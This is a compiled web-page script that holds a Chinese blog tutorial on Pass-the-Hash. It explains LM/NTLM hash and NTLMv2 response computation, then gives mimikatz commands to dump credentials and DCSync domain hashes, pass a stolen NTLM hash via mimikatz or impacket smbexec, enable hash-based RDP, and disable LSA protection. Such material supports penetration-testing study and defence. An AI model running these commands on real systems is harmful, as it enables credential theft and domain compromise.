import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as e,o as l}from"./app-DS0ZCcmM.js";const n={};function h(t,i){return l(),a("div",null,i[0]||(i[0]=[e(`<h1 id="passthehash" tabindex="-1"><a class="header-anchor" href="#passthehash"><span>PasstheHash</span></a></h1><p>之前在做内网横线移动基础时，简单介绍了一下利用Pass the hash手法来实现横向移动，这里打算详细看看</p><h2 id="基础知识" tabindex="-1"><a class="header-anchor" href="#基础知识"><span>基础知识</span></a></h2><p>先来看看哈希传递·，传递的是什么hash</p><h3 id="lm-hash" tabindex="-1"><a class="header-anchor" href="#lm-hash"><span>LM Hash</span></a></h3><p>LM(LAN Mannager) 协议使用的hash就叫做 LM Hash, 由IBM设计和提出, 在过去早期使用。</p><p>由于其存在比较多的缺点，比较容易破解。</p><p><strong>自WindowsVista和Windows Server 2008开始,Windows取消LM hash。</strong></p><h4 id="lm-hash的生成规则" tabindex="-1"><a class="header-anchor" href="#lm-hash的生成规则"><span>LM hash的生成规则</span></a></h4><ul><li>用户的密码被限制为最多14个字符。</li><li>用户的密码转换为大写。</li><li>密码转换为16进制字符串，不足14字节将会用0来再后面补全。</li><li>密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度，再分7bit为一组末尾加0，组成新的编码（str_to_key()函数处理）</li><li>上步骤得到的8byte二组，分别作为DES key为&quot;KGS!@#$%&quot;(转换为16进制字符串后)进行加密。</li><li>将二组DES加密后的编码拼接，得到最终LM HASH值。</li></ul><h4 id="lm-manager-challenge-response" tabindex="-1"><a class="header-anchor" href="#lm-manager-challenge-response"><span>LM Manager Challenge/Response</span></a></h4><p>LM Manager Chanllenge/Response验证机制。</p><p>B向A发送一个8字节challenge,A会根据缓存的LM-Hash计算，并生成一个24字节的响应返回给B，B会根据自己缓存的LM Hash进行相同的计算，并与A的响应进行比较，匹配则验证通过。</p><ul><li><p>具体计算</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">B-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">chanllenge</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> :</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0001020304050607</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> -&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">A</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#假设明文密码为123456 -&gt;计算得LM Hash: 44efce164ab921caaad3b435b51404ee</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">A响应B-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">将LM-Hash转变为21字节：44efce164ab921caaad3b435b51404ee0000000000-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">分为3组，七字节一组</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">44efce164ab921</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">caaad3b435b514</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">04ee0000000000</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">-&gt;将三组分别传递给str_to_key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()进行处理,每组8字节-&gt;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">4476F2C26454E442</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">CA54B47642ACD428</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">0476800000000000</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">使用key对chanllenge分别进行标准的DES加密-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">DAF97F35EDB3D732</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">DF9FC54405D829C6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">A61BFA0671EA5FC8</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">最终得到一个24字节的响应</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">DAF97F35EDB3D732DF9FC54405D829C6A61BFA0671EA5FC8</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">A将响应发给B，B进行相同的运算</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ul><h3 id="ntlm-hash" tabindex="-1"><a class="header-anchor" href="#ntlm-hash"><span>NTLM Hash</span></a></h3><p>为了解决LM加密和身份验证方案中固有的安全弱点，引入了NTLM协议。通常抓到的LM Hash为AAD3B435B51404EEAAD3B435B51404EE，都是没有价值的。</p><h4 id="ntlm-hash的生成" tabindex="-1"><a class="header-anchor" href="#ntlm-hash的生成"><span>NTLM Hash的生成</span></a></h4><p>password : 123456</p><p>-&gt;将密码转化为ascii字符串 : 49 50 51 52 53 54</p><p>-&gt;ascii 转换为十六进制字符串 :31 32 33 34 35 36</p><p>-&gt;十六进制字符串转化为Unicode字符串 :310032003300340035003600</p><p>-&gt;对Unicode字符串使用MD4摘要算法 :32ed87bdb5fdc5e9cba88547376818d4</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/hashcalc.png" alt="hashcalc" tabindex="0" loading="lazy"><figcaption>hashcalc</figcaption></figure><h4 id="ntlm认证过程" tabindex="-1"><a class="header-anchor" href="#ntlm认证过程"><span>NTLM认证过程</span></a></h4><p>本地NTLM认证过程与LM认证过程类似，由三种消息组成:通常称为type 1(协商)，类型type 2(质询)和type 3(身份验证)。</p><p>客户端向服务端发送type1消息，包含客户端支持和服务七请求的功能</p><p>-&gt;服务器使用type2类型进行响应，包含生成的chanlenge</p><p>-&gt;客户端使用type3进行回复，其中包含通过challenge和缓存hash经过加密的response，respose代表着用户是否知晓密码</p><p>-&gt;服务器拿到type3后，同样使用challenge和hash进行加密得到response2，并于type3中的response进行比较。如果hash存储在与域控上，用户服务器就会通过netlogon联系域控建立一个安全通道,然后将type 1,type 2，type3 全部发给域控(这个过程也叫作Pass Through Authentication认证流程)</p><p>-&gt;域控加密得到response2,与response进行比较</p><p><strong>challenge信息能够从type2的流量中分析</strong></p><p>如下有一段质询消息</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>4e544c4d53535000020000000c000c003000000001028100</span></span>
<span class="line"><span>**0123456789abcdef**0000000000000000620062003c000000</span></span>
<span class="line"><span>44004f004d00410049004e0002000c0044004f004d004100</span></span>
<span class="line"><span>49004e0001000c0053004500520056004500520004001400</span></span>
<span class="line"><span>64006f006d00610069006e002e0063006f006d0003002200</span></span>
<span class="line"><span>7300650072007600650072002e0064006f006d0061006900</span></span>
<span class="line"><span>6e002e0063006f006d0000000000</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>用*包裹的部分即为challenge</p><h4 id="ntlm响应计算" tabindex="-1"><a class="header-anchor" href="#ntlm响应计算"><span>NTLM响应计算</span></a></h4><p>NTLM响应计算与LM响应计算是相同的，都是返回24字节的response，只有散列值的计算与LM不同</p><h4 id="ntlmv2响应计算" tabindex="-1"><a class="header-anchor" href="#ntlmv2响应计算"><span>NTLMv2响应计算</span></a></h4><p>NTLM版本2（“NTLMv2”）被用来解决NTLM中存在的安全问题。当启用NTLMv2时，NTLM响应被替换为NTLMv2响应，并且LM响应被替换为LMv2响应。</p><p>计算NTLM密码哈希，方法和上文一样</p><p>假设有如下</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>domain:HACK</span></span>
<span class="line"><span>username : TESTUSER</span></span>
<span class="line"><span>password : 123456</span></span>
<span class="line"><span>challenge : 0123456789abcdef</span></span>
<span class="line"><span>blob: 010000......</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>计算得到NTLM hash：32ed87bdb5fdc5e9cba88547376818d4</p><p>-&gt;将用户名转化为大写:TESTUSER</p><p>-&gt;用户名和domain拼接在一起（domain or server name的值，区分大小写）：TESTUSERHACK</p><p>-&gt;计算拼接所得字符串的Unicode十六进制字符串：540045005300540055005300450052004800410043004b</p><p>-&gt;将NTLM hash作为HMAC MD5的消息认证算法的key(不区分大小写)，加密得到的unicode字符串生成NTLMv2散列：428c8c265137d26b0e3991a9d100eb6d</p><p>-&gt;连接质询消息中的challenge和blob: 0123456789abcdef010000......</p><p>-&gt;使用NTLMv2散列作为密钥，对连接的字符串做HMAC-MD5消息认证码算法，产生一个16字节的hash输出：5185e2269d787185b15a98e704acfd31</p><p>-&gt;产生的16字节输出与blob连接生成NTLMv2响应：5185e2269d787185b15a98e704acfd3101000......</p><h2 id="pth攻击" tabindex="-1"><a class="header-anchor" href="#pth攻击"><span>PTH攻击</span></a></h2><ul><li>为什么能够执行哈希传递攻击,由于LM hash在2012R2之后默认禁用了，这里只说NTLM Hash的情况，在type3计算response的时候，客户端是使用用户的hash进行计算的，而不是用户密码进行计算的。因此在模拟用户登录的时候。是不需要用户明文密码的，只需要用户hash。</li><li>关于补丁kb2871997，能够缓解PTH，还能阻止mimikatz抓取明文密码，后面再来说，先来看最简单的情况</li></ul><h3 id="mimikatz直接抓取hash进行传递" tabindex="-1"><a class="header-anchor" href="#mimikatz直接抓取hash进行传递"><span>mimikatz直接抓取hash进行传递</span></a></h3><ul><li>抓取阶段</li></ul><p>这种都是没有打补丁，mimikatz能够直接抓的情况，上传mimikatz执行命令抓取hash</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#读取lsass的进程信息</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">privilege::debug</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sekurlsa::msv</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/sekurlsamsv.png" alt="sekurlsamsv" tabindex="0" loading="lazy"><figcaption>sekurlsamsv</figcaption></figure><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#获取全部用户的密钥和明文</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">privilege::debug</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sekurlsa::logonPasswords</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> full</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/sekurlsalogon.png" alt="sekurlsalogon" tabindex="0" loading="lazy"><figcaption>sekurlsalogon</figcaption></figure><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#读取SAM数据库获取用户Hash,获取系统所有本地用户的hash</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">privilege::debug</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">token::elevate</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">lsadump::sam</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/samlocal.png" alt="samlocal" tabindex="0" loading="lazy"><figcaption>samlocal</figcaption></figure><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#使用DCSync导出域内所有用户的hash</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">lsadump::dcsync</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /domain:hack.com</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /all</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /csv</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long-long/dcsyncdump.png" alt="dcsyncdump" tabindex="0" loading="lazy"><figcaption>dcsyncdump</figcaption></figure><ul><li><p>传递阶段</p><blockquote><p>mimikatz有自带的hash传递功能，执行以下命令使用已抓到的hash进行传递</p></blockquote><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#通过域管用户的hash进行传递</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sekurlsa::pth</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /user:Administrator</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /domain:hack.com</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /ntlm:ecf2148441c0ef24bdeebc416c876490</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>攻击后会开启一个命令行，在其中可以访问DC的CIFS服务</p><blockquote><p>通过其他支持pth的项目进行传递，例如psexec，通过psexec来pth能够直接登录目标主机</p></blockquote></li></ul><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">python</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> smbexec.py</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -hashes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">  :c17336b6c2ea715e02e8bbd04c91e543</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> hack.com/Administrator@192.168.30.10</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#python smbexec.py -hashes LM HASH:NTLM HASH &lt;domain&gt;/&lt;username&gt;@&lt;IP&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>通过impacket中的项目能够直接登录远程主机</p><ul><li>通过pth登录远程桌面</li></ul><blockquote><p>win server2012 R2以上的版本采用新版RDP，在受限管理员模式下，可以直接使用hash登录远程桌面，不需要提供明文密码</p><p>执行以下命令开启受限管理员模式</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">reg add </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">v DisableRestrictedAdmin </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">t REG_DWORD </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">d </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">00000000</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">f</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></blockquote><p>使用mimikatz进行传递攻击</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">privilege::debug</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> sekurlsa::pth</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /user:Administrator</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /domain:hack.com</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /ntlm:ecf2148441c0ef24bdeebc416c876490</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;/run:mstsc.exe /restrictedadmin&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="无法直接抓取的情况" tabindex="-1"><a class="header-anchor" href="#无法直接抓取的情况"><span>无法直接抓取的情况</span></a></h3><h4 id="debug权限被移除" tabindex="-1"><a class="header-anchor" href="#debug权限被移除"><span>DEBUG权限被移除</span></a></h4><p>mimikatz中抓取hash的方法，大部分都需要获得debug权限，一般管理员账户拥有debug权限，如果将debug权限被移除，则需要debug权限的工具均无法正常工作，如果上传的mimikatz无法获得debug权限，可以选用不需要debug权限就能进行hashdump的dcsync技术，因为该技术是通过像域控发起请求，并非是本地操作</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#dump指定用户的信息，包括hash值</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;lsadump::dcsync /domain:hack.com /user:hack\\Administrator&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exit</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#导出域内所有用户的信息，包括hash值</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;lsadump::dcsync /domain:hack.com /all&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exit</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;lsadump::dcsync /domain:hack.com /all /csv&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exit</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="lsa保护" tabindex="-1"><a class="header-anchor" href="#lsa保护"><span>LSA保护</span></a></h4><p>LSA 包含本地安全机构服务器服务 (LSASS) 进程，可以验证用户的本地和远程登录，并强制本地安全策略。 Windows 8.1 操作系统和更高版本为 LSA 提供其他保护，以防止未受保护的进程读取内存及注入代码。</p><p>当windows启用 LSA保护时，mimikatz无法读取lsass的内存</p><blockquote><p>解决方法一：关闭LSA保护，该操作可以通过修改注册表完成</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#开启LSA保护的报错示例</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # sekurlsa::msv</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> kuhl_m_sekurlsa_acquireLSA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Handle</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> memory</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (0x00000005)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # privilege::debug</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Privilege</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;20&#39;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> OK</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # sekurlsa::logonPasswords</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> kuhl_m_sekurlsa_acquireLSA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Logon</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> list</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#开启LSA保护策略</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> RunAsPPL</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> REG_DWORD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /f</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#关闭LSA保护策略</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> delete</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> RunAsPPL</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>解决方法二：利用mimidrv.sys删除lsass.exe上的保护措施</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#将mimidrv.sys上传到同一目录下，启动mimikatz后进行加载</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> !+</span></span>
